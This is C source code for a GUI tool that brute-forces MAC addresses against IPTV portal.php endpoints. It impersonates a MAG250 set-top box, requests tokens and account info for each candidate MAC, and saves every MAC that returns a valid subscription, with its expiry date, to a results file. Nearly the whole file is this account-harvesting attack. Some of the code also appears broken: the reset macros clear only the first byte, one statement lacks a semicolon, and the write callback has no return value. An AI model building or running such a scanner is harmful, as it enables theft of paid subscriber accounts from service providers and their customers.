/*--------------------------------------------------------------*
 | Source code        : https://github.com/dougy147/smac    |
 | Originally written : 2026.07.31 (YYYY.MM.DD)                 |
 | Last updated       : 2026.08.09 (YYYY.MM.DD)                 |
 | Licence            : BSD                                     |
 *--------------------------------------------------------------*
 | Inspired from mcbash (https://github.com/dougy147/mcbash)    |
 *--------------------------------------------------------------*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>

#include <curl/curl.h>

#include "src/shared.h"
#include "src/gui.h"

#ifdef _WIN32
    #include <windows.h>
#endif

#define DEBUG 0

#define MAX_URL_LEN       512
#define MAX_SN_LEN        64
#define MAX_DEV_ID_LEN    64
#define MAX_TOKEN_LEN     128
#define MAX_RESPONSE_LEN  8192
#define MAX_HEADERS_LEN   1024

bool GRACEFUL_EXIT_ASKED = false;

char tmp_url[MAX_URL_LEN]         = {0};
char tmp_headers[MAX_HEADERS_LEN] = {0};
char response[MAX_RESPONSE_LEN]   = {0};

struct curl_slist *request_headers = {0};

char server_url_previous[MAX_DNS_LEN] = {0}; // used to check if user changed it between scans
char server_url_sanitized[MAX_DNS_LEN] = {0}; // used for results/{filename}.txt
char encoded_mac[FULL_ENCODED_MAC_STR_LEN] = {0}; // 00:1A:79:XX:XX:XX => 00%3A1A%3A79%3AXX%3AXX%3AXX\0
char sn[MAX_SN_LEN]          = {0};
char dev_id[MAX_DEV_ID_LEN]  = {0};

char mac_prefix[FULL_MAC_STR_LEN] = "00:1A:79";

const char *ua       = "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3";
const char *x_ua     = "Model: MAG250; Link: WiFi";
const char *stb_lang = "en";
const char *tz       = "Europe/Amsterdam";

char token[MAX_TOKEN_LEN]       = {0};
    
FILE *mac_file = {0};
char *mac_file_path = {0};

float request_delay = 0 * 1000 * 1000; //µsecond

char *prog_name = {0};

CURL *curl = {0};

FILE *results_file = {0}; // where to store results
char results_filename[MAX_DNS_LEN] = {0};

#define add_to_headers(str,...) \
    snprintf(tmp_headers, sizeof(tmp_headers),(str),__VA_ARGS__);\
    request_headers = curl_slist_append(request_headers,tmp_headers);

#define make_url(URL,path_str,...) \
    snprintf((URL),sizeof((URL)),(path_str),__VA_ARGS__);

#define reset_headers() \
    request_headers = NULL;

#define reset_exp_date() \
    for (int i=0;i<MAX_EXP_DATE_LEN;i++) exp_date[0] = '\0';

#define reset_response() \
    for (int i=0;i<MAX_RESPONSE_LEN;i++) response[0] = '\0';

#define request(DNS, PATH, ...)\
    make_url(tmp_url, "%s" PATH,(DNS),__VA_ARGS__);\
    reset_headers();\
    make_headers();\
    make_request(tmp_url,request_headers);

#define set_results_filename()\
    snprintf(results_filename, sizeof(results_filename),"results/%s.txt",server_url_sanitized);

#define erase_previous_line()\
    printf("\r\033[1A"); 

#define long_long_to_mac_string(MAC, MAC_INT)\
    sprintf((MAC),"%02lX:%02lX:%02lX:%02lX:%02lX:%02lX",\
        (MAC_INT) >> 40 & 0XFF, (MAC_INT) >> 32 & 0XFF, \
        (MAC_INT) >> 24 & 0XFF, (MAC_INT) >> 16 & 0XFF, \
        (MAC_INT) >> 8 & 0XFF, (MAC_INT) >> 0 & 0XFF);  \

#define shift(ptr) (*(ptr)++)

#define arg_match(str)\
    (strcmp(*argv,(str)) == 0)

/* Curl configuration */
size_t static write_callback (void *buffer, size_t size, size_t nmemb, void *ptr) {
    // https://stackoverflow.com/questions/2577654/curl-put-output-into-variable
    strcpy(response,buffer); // this is to save curl response into a variable
}

void make_request(char *url, struct curl_slist *headers)
{

    reset_response();
    curl = curl_easy_init();
    if (!curl) return;

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    //curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);

    curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, (long)4);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, (long)10); // sec
    
    CURLcode response_code = curl_easy_perform(curl);
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
}

void usage(int exit_code) {
    printf("Usage: %s TODO\n", prog_name);
    exit(exit_code);
}

/* Arguments */
void parse_args(int argc, char **argv) {
    prog_name = *argv;
    //printf("prog_name = %s\n", prog_name);

    while (*argv != NULL) {
        if (arg_match("--help") || arg_match("-h")) {
            usage(0);
        } else 
        if (arg_match("--url") || arg_match("-u")) {
            shift(argv);
            set_server_url(*argv);
        } else 
        if (arg_match("--seq")) {
            SCAN_MODE = SEQUENTIAL;
        } else 
        if (arg_match("--random")) {
            SCAN_MODE = RANDOM;
        } else
        if (arg_match("--mac-file")) {
            SCAN_MODE = MAC_FILE;
            shift(argv);
            mac_file_path = *argv;
        } else 
        if (arg_match("--mac-prefix")) {
            shift(argv);
            strcpy(mac_prefix,*argv);
        } else 
        if (arg_match("--delay") || arg_match("-d")) {
            shift(argv);
            request_delay = atof(*argv) * 1000 * 1000; // in µsec for usleep
        }
        shift(argv);
    }
}

void sanitize_server_url() {
    for (int i=0;i<MAX_DNS_LEN;i++) server_url_sanitized[i] = '\0';
    char *p = &(server_url[0]);
    const char *http = "http://";
    const char *https = "https://";
    if (strncmp(http,p,strlen(http)) == 0) p+=strlen(http);
    if (strncmp(https,p,strlen(https)) == 0) p+=strlen(https);
    char break_on[] = { '/', ' ', '\n', '\t' };
    while (*p != '\0') {
        for (int i=0; i<(sizeof(break_on)/sizeof(break_on[0]));i++) {
            if (p[0] == break_on[i]) return;
        }
        server_url_sanitized[strlen(server_url_sanitized)] = p++[0];
    }
}

/* smac */
bool grab_token() {
    char *i = &(response[0]);
    int token_len = 0;
    const char *pattern = "\"token\"";
    while (*i != '\0') {
        if (strncmp(pattern,i,strlen(pattern)) == 0) {
            i+=strlen(pattern);
            while(i[0] == ' ' || i[0] == ':') i++;
            if (i[0] != '"') break;
            i++;
            while(i[0] != '"') token[token_len++] = i++[0];
            break;
        }
        i++;
    }
    token[token_len] = '\0';
    //printf("parsed_token = %s\n", token);
    if (strlen(token) == 0) return false;
    return true;
}

void encode_mac(char *mac) {
    int encoded_mac_len = 0;
    while (mac[0] != '\0') {
        switch (mac[0]) {
            case ':':
                encoded_mac[encoded_mac_len++] = '%';
                encoded_mac[encoded_mac_len++] = '3';
                encoded_mac[encoded_mac_len++] = 'A';
                break;
            default:
                encoded_mac[encoded_mac_len++] = mac[0];
        }
        mac++;
    }
    encoded_mac[encoded_mac_len] = '\0';
    //printf("encoded_mac = %s\n", encoded_mac);
}

void make_headers() {
    // append headers to request
    add_to_headers("Accept: */*", NULL);

    // building user agents and cookie
    add_to_headers("User-Agent: %s", ua);
    add_to_headers("X-User-Agent: %s", x_ua);
    add_to_headers("Cookie: mac=%s;sn=%s;device_id=%s;stb_lang=%s;tz=%s;", mac,sn,dev_id,stb_lang,tz);

    // add token
    add_to_headers("Authorization: Bearer %s", token);
}

long long power(int n, unsigned int exp) {
    long long res = 1;
    while (exp > 0) {
        res*=n;
        exp--;
    }
    return res;
}

bool next_mac_sequential() {
    char mac_no_colon[MAC_LEN+1] = {0};
    for (int i = 0; i < strlen(mac); i++) {
        if (mac[i] != ':') mac_no_colon[strlen(mac_no_colon)] = mac[i];
    }
    mac_no_colon[strlen(mac_no_colon)] = '\0';

    long long mac_as_long_long = strtoll(mac_no_colon,NULL,16);
    long long next_mac_as_long_long = (mac_as_long_long + 1) % power(16,MAC_LEN);
    
    char next_mac[FULL_MAC_STR_LEN] = {0};
    long_long_to_mac_string(next_mac,next_mac_as_long_long);
    set_mac(next_mac);
    return true;
}

bool next_mac_random() {
    // handle prefix
    char mac_prefix_no_colon[MAC_LEN+1] = {0};
    for (int i = 0; i < strlen(mac_prefix); i++) {
        if (mac_prefix[i] != ':') mac_prefix_no_colon[strlen(mac_prefix_no_colon)] = mac_prefix[i];
    }
    mac_prefix_no_colon[strlen(mac_prefix_no_colon)] = '\0';

    int bytes_to_fill = MAC_LEN - strlen(mac_prefix_no_colon);

    for (int i = 0; i<bytes_to_fill; i++) mac_prefix_no_colon[strlen(mac_prefix_no_colon)] = '0';
    long long mac_prefix_as_long_long = strtoll(mac_prefix_no_colon,NULL,16);
 
    char random_mac[FULL_MAC_STR_LEN] = {0};

    long long random_part = 0;
    for (int i=1;i<=bytes_to_fill;i++) {
        random_part += (long long)rand() << ((i-1)*4);
    }
    random_part %= power(16,bytes_to_fill);
    long long random_mac_as_long_long = mac_prefix_as_long_long + random_part;
    long_long_to_mac_string(random_mac, random_mac_as_long_long);
    set_mac(random_mac);
    //encode_mac(random_mac);

#if DEBUG
    printf("mac_prefix = %s            \n", mac_prefix);
    printf("bytes_to_fill = %d\n", bytes_to_fill);
    printf("power(16,%d) = %lld\n",bytes_to_fill, power(16,bytes_to_fill));
    printf("mac_prefix_no_colon = %s\n",mac_prefix_no_colon);
    printf("mac_prefix_as_long_long = %lld\n",mac_prefix_as_long_long);
    printf("random_part       = %lld\n",random_part);
    printf("random_mac_as_long_long = %lld\n", random_mac_as_long_long);
    printf("random_mac = %s\n", random_mac);
#endif

    return true;
}

bool next_mac_mac_file() {
    char next_mac_in_file[FULL_MAC_STR_LEN] = {0};
    char c;
    while (true) {
        if ((c = fgetc(mac_file)) == EOF) {
            printf("[x] Reached end of file \"%s\"\n", mac_file_path);
            exit(0);
        }
        if (c == ' ' || c == '\n') {
            if (strlen(next_mac_in_file) > 0) break;
            continue;
        }
        next_mac_in_file[strlen(next_mac_in_file)] = c;
    }

    set_mac(next_mac_in_file)
    return true;
}

bool next_mac() {
    if (SCAN_MODE == SEQUENTIAL) return next_mac_sequential();
    if (SCAN_MODE == RANDOM)     return next_mac_random();
    if (SCAN_MODE == MAC_FILE)   return next_mac_mac_file();
    fprintf(stderr,"[!] Unknown mode");
    return false;
}

bool get_token() {
    request(server_url,"/portal.php?action=handshake&type=stb&token=&mac=%s",encoded_mac);

    // don't fail right away
    for (int i = 0; i < 10; i++) {
        if (grab_token()) return true;
        request(server_url,"/portal.php?action=handshake&type=stb&token=&mac=%s",encoded_mac);
    }

    //TODO: better error parsing+info
    //GUI_display_error("Could not get token");
    return false;
}

bool get_exp_date() {
    reset_exp_date(); // needed if curl goes faster than us
    request(server_url,"/portal.php?type=account_info&action=get_main_info&mac=%s",mac);

    char *i = &(response[0]);
    int exp_date_len = 0;
    const char *pattern = "\"phone\"";
    while (*i != '\0') {
        if (strncmp(pattern,i,strlen(pattern)) == 0) {
            i+=strlen(pattern);
            while(i[0] == ' ' || i[0] == ':') i++;
            if (i[0] != '"') break;
            i++;
            while(i[0] != '"') { 
                /* sometimes random bytes are inserted in responses? */
                /* they usually are between two '\r\n', so... skip'em */
                if (i[0] == '\r' && i[1] == '\n') {
                    i+=2;
                    while (i[0] != '\r' && i[1] != '\n') i++;
                    i+=2;
                    continue;
                }
                exp_date[exp_date_len++] = i++[0];
            }
            break;
        }
        i++;
    }
    exp_date[exp_date_len] = '\0';
    if (strlen(exp_date) == 0) return false;
#if DEBUG
    printf("parsed_expiration_date = <%s>\n", exp_date);
#endif
    return true;
}

bool is_valid_account() {
    get_token();
    return get_exp_date();
}

void write_account_to_file() {
    set_results_filename();
    results_file = fopen(results_filename,"a");
    if (VALID_ACCOUNTS_COUNT == 1) {
        fprintf(results_file,"\n%s\n",server_url);
    }
    fprintf(results_file,"%s [%s]\n",mac,exp_date);
    fclose(results_file);
}

void did_server_url_changed() {
    if (strlen(server_url_previous) == 0) {
        strcpy(server_url_previous,server_url);
        return;
    }
    if (strcmp(server_url_previous,server_url) == 0) {
        printf("they are the same");
        return;
    }
    set_results_filename();
    VALID_ACCOUNTS_COUNT = 0;
    MAC_SCANNED_COUNT = 0;
    set_mac("00:1A:79:00:00:00"); // TODO change this
    GUI_clear_listbox();// remove all in listbox
    strcpy(server_url_previous,server_url);
}

void *scan(void *a) {
    GUI_set_server_url_from_entry();
    sanitize_server_url();
    did_server_url_changed();

#if DEBUG
    printf("Setting URL: <%s>\n",server_url);
    printf("Sanitized URL: %s\n", server_url_sanitized);
#endif
    if (strlen(server_url) == 0) { // TODO: is_invalid(server_url);
        GUI_display_error("Please provide a valid URL");
        SCAN_THREAD = 0;
        GUI_scan_button_set_label();
        return NULL;
    }

    while (!GRACEFUL_EXIT_ASKED) {
        MAC_SCANNED_COUNT++;
#if DEBUG
        printf("[%d] <%s>\n", MAC_SCANNED_COUNT, mac);
        erase_previous_line();
#endif
        if (is_valid_account()) {
            GUI_add_to_accounts_listbox();
            VALID_ACCOUNTS_COUNT++;
            write_account_to_file();
#if DEBUG
            printf("[%d] \033[1;32m%s\033[0m [%s]\n", MAC_SCANNED_COUNT, mac, exp_date);
#endif
        }
        if (!next_mac()) break;
        GUI_update_mac_label(); // interface
        usleep(request_delay);
    }

    GRACEFUL_EXIT_ASKED = false;
    return NULL;
}

void scan_start() {
    printf("SCAN_THREAD = %d\n", SCAN_THREAD);
    if (SCAN_THREAD > 0) return;
    // this is called in place of "scan()" 
    // for instantiating the thread
    pthread_create(&SCAN_THREAD, NULL, scan, NULL);
}

void scan_stop() {
    GRACEFUL_EXIT_ASKED = true; // cf below
    if (SCAN_THREAD > 0) pthread_cancel(SCAN_THREAD); // does nothing on Windows
    SCAN_THREAD = 0;
#ifndef _WIN32
    // ignore this if compiling for windows
    // race condition => thread might never update GRACEFUL_EXIT_ASKED
    GRACEFUL_EXIT_ASKED = false;
#endif
    GUI_reset_mac_label();
    //MAC_SCANNED_COUNT = 0;
}

int main(int argc, char **argv) {

#ifdef _WIN32
    // Hide useless widnows console
    HWND console = GetConsoleWindow();
    ShowWindow(console, SW_HIDE);
#endif

    srand(time(NULL));
    curl_global_init(CURL_GLOBAL_ALL);

    parse_args(argc, argv);
    //check_options(); // TODO
    if (SCAN_MODE == SEQUENTIAL && strlen(mac) == 0) 
        set_mac("00:1A:79:00:00:00");

    //create the "results" directory if does not exist
    system("mkdir results");

    //SCAN_MODE = MAC_FILE; // tmp 
    //mac_file_path = "./macs.txt"; // tmp

    if (SCAN_MODE == MAC_FILE) {
        // we have to open provided macfile
        if (!(mac_file = fopen(mac_file_path,"r"))) {
            fprintf(stderr, "[!] Could not open file \"%s\"\n", mac_file_path);
            exit(1);
        }
    }

    /* launch the interface */
    GtkApplication *app = gtk_application_new ("org.gtk.example", G_APPLICATION_DEFAULT_FLAGS);
    g_signal_connect (app, "activate", G_CALLBACK (activate), NULL);

    int status = g_application_run (G_APPLICATION (app), argc, argv);
    g_object_unref (app);

    return 0;
}
